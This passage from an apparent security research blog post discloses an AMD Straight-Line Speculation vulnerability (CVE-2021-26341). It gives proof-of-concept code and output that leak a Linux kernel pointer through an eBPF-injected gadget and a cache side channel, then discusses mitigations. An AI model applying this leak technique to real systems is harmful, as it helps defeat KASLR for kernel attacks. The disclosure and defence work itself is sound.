</code></pre>
<p>Which is exactly the gadget code I was hoping to execute.</p>
<p>After the eBPF program work is done, the user-land part of the exploit can be built.</p>
<p>I used <code>libbpf</code>&#39;s wrapper over the <code>bpf()</code> system call to load the eBPF program into the kernel:</p>
<pre><code>char <span>bpf_log_buf[BPF_LOG_BUF_SIZE];
</span>
prog_fd = <span>bpf_load_program(BPF_PROG_TYPE_SOCKET_FILTER, </span>prog, <span>insns_cnt, </span><span>&#34;GPL&#34;</span>, <span>0</span>, <span>bpf_log_buf, </span><span>BPF_LOG_BUF_SIZE);
</span>if (prog_fd &lt; <span>0</span>) {
    printf(<span>&#34;LOG:\n%s&#34;</span>, <span>bpf_log_buf);
</span>    return <span>1</span>
}
</code></pre>
<p>Conveniently, when a program cannot be loaded for whatever reason (for example: program gets rejected by the eBPF verifier), <code>bpf_log_buf</code> will contain a very detailed explanation of the problem, including the eBPF pseudo-code listing.</p>
<p>A successfully loaded eBPF program can be attached to the UDP socket with the following system call:</p>
<pre><code>if (<span>setsockopt</span>(<span>sock</span>, SOL_SOCKET, SO_ATTACH_BPF, <span>&amp;prog_fd</span>, sizeof(<span>prog_fd</span>)) &lt; <span>0</span>)
    goto error
</code></pre>
<p>To trigger execution of the eBPF program in the kernel, we can simply transmit some bogus UDP packets via the socket:</p>
<pre><code>struct sockaddr_in si_me = {<span>0</span>}
char <span>buf[8] </span>= {<span>0x90</span>}

si_me.sin_family = AF_INET
si_me.sin_port = htons(<span>BOGUS_PORT);
</span>si_me.sin_addr.s_addr = inet_addr(<span>&#34;127.0.0.1&#34;</span>)

sendto(sock, <span>buf, </span>sizeof(<span>buf), </span><span>0</span>, (struct sockaddr *) &amp;si_me, sizeof(si_me))
</code></pre>
<p>The rest of the user-land program implementing the main loop leaking the pointer can look like this:</p>
<pre><code><span>uint64_t</span> result = <span>0</span>, old_result = <span>0</span>;
<span>int</span> key = <span>1</span>

<span>while</span>(<span>1</span>) {
    <span>for</span> (<span>long</span> <span>long</span> bit_pos = <span>6</span>; bit_pos &lt; <span>48</span>; bit_pos++ ) {
        
        bpf_map_update_elem(map_fd, &amp;key, &amp;bit_pos, BPF_ANY);

        flusher();
        clflush(cl);
        mfence();

        
        sendto(sock, buf, <span>sizeof</span>(buf), <span>0</span>, (<span>struct</span> sockaddr *) &amp;si_me, <span>sizeof</span>(si_me));

        <span>int</span> oracle = cache_channel_measure_bit(cl, baseline);
        if (oracle == ZERO)
            result |= ((<span>uint64_t</span>) <span>1</span> &lt;&lt; bit_pos);

        if(result != old_result) {
            <span>printf</span>(<span>&#34;Result: %016lx\n&#34;</span>, result ^ <span>0xffffffffffffffc0</span>);
            old_result = result;
        }
    }
}
</code></pre>
<p>where <code>flusher()</code> is the exact same routine as before:</p>
<pre><code>asm volatile (
    <span>&#34;.align 64<span>\n</span>    &#34;</span>
    <span>&#34;.rept 8192<span>\n</span>   &#34;</span>
    <span>&#34;    jmp 1f<span>\n</span>   &#34;</span>
    <span>&#34;    .rept 30<span>\n</span> &#34;</span>
    <span>&#34;        nop<span>\n</span>  &#34;</span>
    <span>&#34;    .endr<span>\n</span>    &#34;</span>
    <span>&#34;1:  jmp 2f<span>\n</span>   &#34;</span>
    <span>&#34;    .rept 29<span>\n</span> &#34;</span>
    <span>&#34;        nop<span>\n</span>  &#34;</span>
    <span>&#34;    .endr<span>\n</span>    &#34;</span>
    <span>&#34;2:  nop<span>\n</span>      &#34;</span>
    <span>&#34;.endr<span>\n</span>        &#34;</span>
);
</code></pre>
<p>The very same cache oracle mechanism as before is used here. Even though the cache oracle can only leak bits 6 to 47 of the secret, it is no problem at all. We already know the value of bits 48 and above for a canonical kernel memory pointer (all set to 1). Also, for breaking KASLR, we do not care about bits 0 to 5.</p>
<p>I ran this PoC in a virtualized environment with pinned vCPUs on the following AMD CPU:</p>
<pre><code>CPU family:          <span>23</span>
Model:               <span>1</span>
Model name:          AMD EPYC <span>7601</span> <span>32</span>-Core Processor
</code></pre><p>Example results:</p>
<pre><code>wipawel@pawel-poc:~$ time taskset -c <span>2</span> ./ebpf_poc
Baseline: <span>155</span>
Result: <span>0xfffffffffffffec0</span>
Result: <span>0xffffff7ffffffec0</span>
Result: <span>0xffffff7ffffffe40</span>
Result: <span>0xffffff7ffffff640</span>
Result: <span>0xffffff7ffffef640</span>
Result: <span>0xffffff7ffefef640</span>
Result: <span>0xffffdf7ffefef640</span>
Result: <span>0xffffdf77fefef640</span>
Result: <span>0xffffdf76fefef640</span>
Result: <span>0xffffdf56fefef640</span>
Result: <span>0xffffdf56fefe7640</span>
Result: <span>0xffffdf56f6fe7640</span>
Result: <span>0xffffdf16f6fe7640</span>
Result: <span>0xffff9f16f6fe7640</span>
Result: <span>0xffff9f16f6ee7640</span>
Result: <span>0xffff9f16f2ee7640</span>
Result: <span>0xffff9f16f2ee7600</span>
Result: <span>0xffff9f16e2ee7600</span>
Result: <span>0xffff9f16c2ee7600</span>

real    0m0.041s
user    0m0.022s
sys    0m0.019s
</code></pre>
<p>As you can see, the kernel memory pointer is quickly and 100% reliably rendered for us by exploiting the SLS gadget injected via eBPF.</p>
<p>What might be a little surprising is the speed of leaking the pointer. After all, there is rather heavy BTB flushing going on and a UDP packet sent asynchronously triggering eBPF program execution in the kernel that comes with non-negligible context switch overhead.</p>
<p>According to my experiments, the crucial component allowing to achieve such bandwidth is the right alignment of the unconditional branches. Ideally, the first branch should be aligned at the beginning of a cache line.
Secondly, the cache oracle has much fewer bits to leak with the example address above. The cache oracle detects and leaks 0 bits. Therefore, the fewer 0 bits in the secret, the fewer iterations of the loop in needed to leak the entire secret. In the previous example we were leaking <code>0x4141414141414141</code> secret data, which in binary looks like this: <code>100000101000001010000010100000101000001010000010100000101000001</code>. This requires at least 47 successful loop iterations to leak the entire 8 bytes. Whereas, with the kernel memory pointer <code>0xffff9f16c2ee7600</code> (binary: <code>1111111111111111100111110001011011000010111011100111011000000000</code>), we only need 25 iterations for the entire 8 bytes. The BTB flushing overhead also accumulates accordingly.</p>
<h2 id="what-are-the-amd-recommended-sls-mitigations-">What are the AMD-recommended SLS mitigations?</h2>
<p>The mitigations for SLS are two-fold:</p>
<ol>
<li>mitigations for direct and indirect <code>JMP</code> and <code>RET</code> instructions</li>
<li>mitigations for direct and indirect <code>CALL</code> instructions</li>
</ol>
<p>The obvious mitigation that automatically comes to mind is placing a serializing instruction (or at least an instruction that kills the SLS speculation window) right after the direct or indirect unconditional branch. This however is effectively only feasible for the first category of the unconditional branches (<code>JMP</code>s and <code>RET</code>s), because the architectural execution does not have to continue past these instructions. Placing an <code>LFENCE</code> (three-byte opcode), <code>UD2</code> (two-byte opcode) or an <code>INT3</code> (single-byte opcode) is a readily affordable solution, because these instructions do not execute architecturally and thereby incur minimal performance penalty. For the same reason, using exception or interrupt-triggering instructions becomes feasible. To optimize for binary space, a shorter instruction (<code>INT3</code>) is naturally preferred.</p>
<h3 id="what-about-mitigating-calls-">What about mitigating calls?</h3>
<p>The SLS mitigations for <code>CALL</code> instructions however are not that simple. The architectural execution resumes right after the <code>CALL</code>, when control flow returns from the callee routine. It essentially means that, unlike with <code>JMP</code>s and <code>RET</code>s, instructions mitigating the SLS for <code>CALL</code>s have to execute architecturally as well. Hence, usage of any exception triggering instruction is immediately off the table.</p>
<p>On top of that, while it is possible to use serializing instructions like <code>LFENCE</code> to mitigate SLS for <code>CALL</code>s, it is not really feasible performance-wise. In almost every code base, <code>CALL</code> instructions are ubiquitous and following each of them with a serializing instruction would be disastrous to overall performance.</p>
<p>However, to the best of my knowledge, there have been at least two interesting mitigation proposals for <code>CALL</code>s with much lower footprint than <code>LFENCE</code>.</p>
<p>The first was suggested by AMD and is based on the observation that the <code>CALL</code> instruction is effectively executed as two uops:</p>
<ol>
<li>push return address onto stack</li>
<li>direct unconditional jump to the callee routine</li>
</ol>
<p>The push uop always executes before the direct unconditional jump, which is the subject of the SLS. Therefore, when SLS occurs, the stack pointer and content on the stack is already modified. This allows to detect whether the code following the <code>CALL</code> instruction is executed under SLS or not.</p>
<p>Let&#39;s take a look at the following example presenting the idea:</p>
<pre><code>mov %rsp, %r11    ; save current value of the stack pointer in an available register (if any)
call $addr        ; the push part of the call modifies the %rsp value
cmp %r11, %rsp    ; when SLS over the call occurs, the current %rsp value will be different from the one in %r11
                  ; this allows to detect whether SLS or architectural execution occurs
</code></pre>
<p>If there is no free register available for storing the current stack pointer, there is a slightly less efficient method available:</p>
<pre><code>push $<span>0</span>           ; push a canary value onto the stack
call $addr        ; the push part of the call modifies the %rsp value
cmp $<span>0</span>, (%rsp)    ; when SLS over the call occurs, the current %rsp value does not point at the canary, but the return address
add $<span>8</span>, %rsp      ; clean the stack
</code></pre>
<p>The above mitigation proposal is certainly more efficient than blindly using <code>LFENCE</code> everywhere. Especially, when free registers are available, the overhead might be reasonable.</p>
<p>Nevertheless, the mitigation overhead is still not negligible. For one, the space needed by the mitigation is extensive. It also has to be decided, what to do when SLS is detected: execute <code>LFENCE</code> or maybe apply <code>CMOV</code> instruction restricting memory access range of a gadget?</p>
<p>Perhaps more problematic, this proposal would interact with certain calling conventions like stdcall which pass arguments on the stack and adjust the stack in the callee before return.</p>
<p>For these reasons, Andrew Cooper of Citrix, a well-known Xen hypervisor developer and x86 architecture expert, suggested a much simpler and much more performant mitigation: clearing the callee return value register (<code>%RAX</code>) before the <code>CALL</code> could be good enough for the majority of the SLS cases.</p>
<h4 id="why-much-more-performant-">Why much more performant?</h4>
<p>Clearing the <code>%RAX</code> register can be trivially done by a simple <code>XOR %RAX, %RAX</code> or <code>MOV $0, %RAX</code> instruction. Both of them have to be executed before the call, but both of them have similar very low execution overhead. The xor variant has a flag setting side-effect, which is not relevant for compiler-generated code before the call and takes two bytes of space. The mov instruction is longer due to the immediate operand encoding, but does not have any side-effects.</p>
<h4 id="why-is-it-enough-">Why is it enough?</h4>
<p>The SLS over a <code>CALL</code> can only potentially create an interesting gadget when the following code executes with unmodified values in registers. However, for compiler-generated code, all registers that are clobbered by the callee routine have to be reloaded with values, because from the compiler point of view they are dead. Therefore, compiler emitted code following the <code>CALL</code> will first re-set the clobbered registers before using them. Hence, the clobbered registers cannot be potentially abused under SLS.</p>
<p>Registers that are preserved by the callee routine do not change their value before and after the <code>CALL</code>, hence the code following the <code>CALL</code> will execute also architecturally with the same register values. There is therefore no difference between the SLS and architectural execution of the code; if there are no other issues present in the code (e.g. an existing full Spectre v1 gadget or code bugs), both types of execution should be benign.</p>
<p>This leaves the <code>CALL</code> return value register <code>%RAX</code> (on x86_64) as the only one worth fixing to a predefined value. Architecturally, the <code>%RAX</code> register will likely change its value upon return from the call, hence it should be safe to modify it right before the <code>CALL</code> instruction.</p>
<p>With the <code>%RAX</code> register value set to a benign value, there should be no potential for SLS gadget existence in the code generated by a sensible compiler. </p>
<h4 id="what-are-the-limitations-">What are the limitations?</h4>
<p>The <code>XOR %RAX, %RAX</code> mitigation has been proposed with compiler-generated code in mind. For its effectiveness, certain assumptions about the compiler behavior must hold. This is obviously not applicable to inline or external assembly code, where the assumptions have to be manually verified before applying the mitigation.</p>
<p>Another problem is calling convention compatibility. Certain ABIs like <code>fastcall</code> or  <code>mregparm(3)</code> (used by 32-bit Linux kernels) may use the <code>%RAX</code> (<code>%EAX</code> on 32-bit) register as a callee function input parameter. Calls of such functions cannot be protected with the mitigation as it breaks the ABI.</p>
<p>A similar problem may arise with calls to functions supporting variadic argument lists, where the <code>%RAX</code> register may be used as a hidden parameter (in SysV ABI for AMD64 the <code>%AL</code> register is used to specify the number of vector registers used).</p>
<p>Last, but not least, the <code>%RAX</code> register might not be the only register used for returning values from a function. For example, small structures could be returned in both <code>%RAX</code> and <code>%RDX</code> registers.  </p>
<p>Given the limitations and resulting complications, this mitigation cannot be applied blindly. A careful evaluation of the actual call site context and the callee routine is needed.</p>

<p>In this blog article, I presented the story of discovering and researching the vulnerability CVE-2021-26341, affecting the Zen1 and Zen2 microarchitectures of AMD CPUs. The vulnerability allows to speculatively execute, via Straight-Line Speculation (SLS), code following direct unconditional branches like <code>JMP</code> or <code>CALL</code>. This code is typically either considered dead, used for code metadata and padding, or otherwise not belonging to the current execution control flow as it might just linearly follow basic blocks in memory.</p>
<p>I also discussed how the corresponding missing Branch Target Buffer entries for direct unconditional branches result in Straight-Line Speculation and presented reliable methods of inducing the speculation.</p>
<p>Because of this vulnerability, it might be possible to identify otherwise benign code constructs that on affected CPUs form limited, but potentially exploitable SLS gadgets. As demonstrated with the eBPF example, it is also possible to exploit the vulnerability with manually-constructed and self-injected gadgets. The presented method can be used for example to break the KASLR mitigation of the Linux kernel.</p>
<p>Finally, because all system software executing on the affected processors might be impacted, I discussed potential SLS mitigations and their limitations. Today&#39;s grsecurity beta patches will provide adequate hardening with minimal overhead and performance impact, with the added hardening being backported to all its supported kernel versions in the coming weeks.</p>
<p>Last, but not least, we were able to once again see how the AMD branch (mis)predictor involuntarily opens up new possibilities for speculative execution attacks and get a sense of how little it takes to exploit them. Another lesson that even dead or unreachable code cannot blindly be deemed safe and ignored.</p>
<p>As even trivial direct unconditional branches can be easily mispredicted by some CPUs, program execution can go where no CPU has been believed to go before.</p>
<p>Don&#39;t believe me? Look at this comment from a prominent Linux kernel developer in a post-Spectre 2018 LKML discussion <a href="https://lore.kernel.org/all/D6F6643E-1206-4D87-B8ED-5FF17C15A0EF@zytor.com/">[9]</a>:</p>
<blockquote><pre>[...]
&gt;At some point the cpu will decode the jmp/ret and fetch/decode from the
&gt;target address.
&gt;I guess it won&#39;t try to speculatively execute the &#39;pad&#39; instructions
&gt;- but you can never really tell!

[...]

The CPU doesn&#39;t speculate down past an unconditional control transfer. Doing so would be idiotic.
</pre></blockquote><p>Well... how about that!?</p>
<h2 id="references">References</h2>
<p>[1] <a href="https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1026">https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1026</a></p>
<p>[2] <a href="https://grsecurity.net/amd_branch_mispredictor_just_set_it_and_forget_it">https://grsecurity.net/amd_branch_mispredictor_just_set_it_and_forget_it</a></p>
<p>[3] <a href="https://pax.grsecurity.net/docs/PaXTeam-H2HC15-RAP-RIP-ROP.pdf">https://pax.grsecurity.net/docs/PaXTeam-H2HC15-RAP-RIP-ROP.pdf</a></p>
<p>[4] <a href="https://github.com/KernelTestFramework/ktf">https://github.com/KernelTestFramework/ktf</a></p>
<p>[5] <a href="https://www.phoronix.com/scan.php?page=news_item&amp;px=Arm-Straight-Line-Speculation">https://www.phoronix.com/scan.php?page=news_item&amp;px=Arm-Straight-Line-Speculation</a></p>
<p>[6] <a href="https://developer.arm.com/support/arm-security-updates/speculative-processor-vulnerability/downloads/straight-line-speculation">https://developer.arm.com/support/arm-security-updates/speculative-processor-vulnerability/downloads/straight-line-speculation</a></p>
<p>[7] <a href="https://developer.amd.com/wp-content/resources/56305.zip">https://developer.amd.com/wp-content/resources/56305.zip</a></p>
<p>[8] <a href="https://www.kernel.org/doc/Documentation/networking/filter.txt">https://www.kernel.org/doc/Documentation/networking/filter.txt</a></p>
<p>[9] <a href="https://lore.kernel.org/all/D6F6643E-1206-4D87-B8ED-5FF17C15A0EF@zytor.com/">https://lore.kernel.org/all/D6F6643E-1206-4D87-B8ED-5FF17C15A0EF@zytor.com/</a></p>

                                        </div><!-- .panel -->
                                </div><!-- .wrap -->
                        </section></div>
  </body>
</html>
